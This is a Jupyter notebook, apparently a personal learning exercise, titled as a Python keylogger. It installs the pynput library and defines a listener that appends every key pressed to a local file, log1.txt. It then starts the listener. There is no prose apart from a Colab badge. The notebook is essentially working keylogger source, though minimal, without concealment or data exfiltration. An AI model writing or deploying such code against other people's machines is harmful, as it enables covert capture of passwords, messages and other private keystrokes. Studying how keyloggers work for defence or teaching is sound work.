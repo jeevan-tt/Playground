{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "kernelspec": {
      "display_name": "Python 3",
      "language": "python",
      "name": "python3"
    },
    "language_info": {
      "codemirror_mode": {
        "name": "ipython",
        "version": 3
      },
      "file_extension": ".py",
      "mimetype": "text/x-python",
      "name": "python",
      "nbconvert_exporter": "python",
      "pygments_lexer": "ipython3",
      "version": "3.8.3"
    },
    "colab": {
      "name": "keyloger using python.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "include_colab_link": true
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/jeevan-tt/Playground/blob/master/keyloger_using_python.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "LdWWQJF0Vngd",
        "colab_type": "code",
        "colab": {},
        "outputId": "99b7d819-ba62-4e8e-e344-86143a852113"
      },
      "source": [
        "pip install pynput\n"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Collecting pynputNote: you may need to restart the kernel to use updated packages.\n",
            "\n",
            "  Downloading pynput-1.7.1-py2.py3-none-any.whl (99 kB)\n",
            "Requirement already satisfied: six in c:\\programdata\\anaconda3\\lib\\site-packages (from pynput) (1.15.0)\n",
            "Installing collected packages: pynput\n",
            "Successfully installed pynput-1.7.1\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "t_ykRW22Vng2",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "\n",
        "from pynput.keyboard import Listener"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "Pvo5XiZMVnhB",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "def writeofile(key):\n",
        "        keydata = str(key)\n",
        "        keydata = keydata.replace(\"\",\"\")\n",
        "        with open(\"log1.txt\",\"a\") as f:\n",
        "                  f.write(keydata)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "ItebhJ07VnhR",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "with Listener(on_press =  writeofile) as l:\n",
        "    l.join()"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "bj-lilnQVnhe",
        "colab_type": "code",
        "colab": {},
        "outputId": "23f42973-a7ee-43d5-89c8-cf37180b30f1"
      },
      "source": [
        "pwd"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "'C:\\\\Users\\\\ELCOT'"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 1
        }
      ]
    }
  ]
}